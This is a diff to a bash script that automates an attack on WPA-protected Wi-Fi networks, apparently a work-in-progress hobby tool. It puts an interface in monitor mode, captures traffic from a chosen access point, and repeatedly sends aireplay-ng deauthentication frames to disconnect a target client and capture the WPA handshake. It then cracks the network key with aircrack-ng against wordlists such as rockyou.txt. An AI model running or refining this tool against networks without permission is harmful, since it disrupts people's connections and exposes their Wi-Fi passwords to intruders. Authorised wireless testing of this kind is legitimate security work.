@@ -42,8 +42,8 @@ monitor_mode() {
 
 }
 
-# Prompts attacker to enter BSSID and CLIENT MAC address
-obtain_victim_info() {
+# Prompts user to enter BSSID MAC address of target AP
+obtain_ap() {
 
 	x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &
 
@@ -54,15 +54,11 @@ obtain_victim_info() {
 	read -p "Enter target BSSID: " APMAC
 	sleep 1
 
-	read -p "Enter STATION MAC address: " CLMAC
-	sleep 1
-
 	# Finds PID of airodump-ng and kills it
         TEMPPID=`ps -ef | grep "\bairodump-ng -w dumpfiles/dump $INTERFACE\b" | awk '{print $2}'`
         kill 15 $TEMPPID
 
 }
-
 
 # Obtains the specific channel which the given BSSID is on
 obtain_channel() {
@@ -85,12 +81,23 @@ wpa_handshake() {
 	local HSHAKE
 	local CRACKPID DUMPPID
 
+	# DELETE THIS JUST FOR TESTING
+	INTERFACE="wlan0mon"
+	CH=9
+	APMAC=""
+
+	create_psk_file
+
+	
 	echo
 	echo "Attempting to capture packets on channel $CH..."
 
 	# Displays airodump-ng and captured packet info for user on channel $CH
-	x-terminal-emulator -e "airodump-ng -w crackfiles/psk -c $CH $INTERFACE" &
+	x-terminal-emulator -e "airodump-ng -w crackfiles/$PSKFILE -c $CH $INTERFACE" &
 	sleep 2
+
+	read -p "Enter target client MAC: " CLMAC
+	sleep 1
 
 	echo Attempting to get WPA handshake on $APMAC...
 
@@ -99,10 +106,10 @@ wpa_handshake() {
 	# Checks if WPA handshake was successfully retrieved
 	while [ -n "$HSHAKE" ]
 	do
-		aireplay-ng -0 5 -a $APMAC -c $CLMAC $INTERFACE
-	        sleep 5
+		aireplay-ng -0 1 -a $APMAC -c $CLMAC $INTERFACE
+	        sleep 3
 
-		# Prints to output.txt if WPA handshake was found
+		# Attempts to obtain WPA handshake by saving to output file
 		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap > dumpfiles/output.txt &
 		sleep 1
 
@@ -130,6 +137,27 @@ wpa_handshake() {
 
 	echo WPA handshake has been found!
 
+}
+
+# Prompts user to enter file name for psk file
+create_psk_file() {
+	read -p "Enter file name for psk: " PSKFILE
+
+	#Now check if any files have the same name: FIX THIS
+	cd crackfiles
+	CRACKFILES=(*)
+
+	for FILE in "${CRACKFILES[@]}"
+	do
+		if [ "$FILE" == "$PSKFILE" ]
+		then
+			echo File name taken!
+			read -p "Enter file name for psk: " PSKFILE
+		fi
+	done
+	
+	echo Creating psk file named: $PSKFILE
+	cd ..
 }
 
 # Attempts to crack WPA key using WPA handshake through public wordlists
@@ -161,13 +189,9 @@ wordlist_crack() {
 	sleep 1
 	cd ..
 
-	#DELETE THIS WHEN DONE
-	APMAC=AC:22:0B:85:7E:B1	
-	#	
-
-	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/psk*.cap" &
+	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/psk*.cap ; bash" &
 	echo 
-	
+		
 	#Prompts user to exit aircrack by pressing enter
 	read -p "Press <enter> to exit aircrack... " 
 	read -p "Are you sure [Y/N]? " RESPONSE
@@ -235,8 +259,8 @@ end_attack() {
 
 #obtain_interface
 #monitor_mode
-#obtain_victim_info
+#obtain_ap
 #obtain_channel
-#wpa_handshake
-	#ADD AN OPTION TO INCLUDE NAME OF PSK FILE
+wpa_handshake
+#ADD AN OPTION TO INCLUDE NAME OF PSK FILE
 wordlist_crack
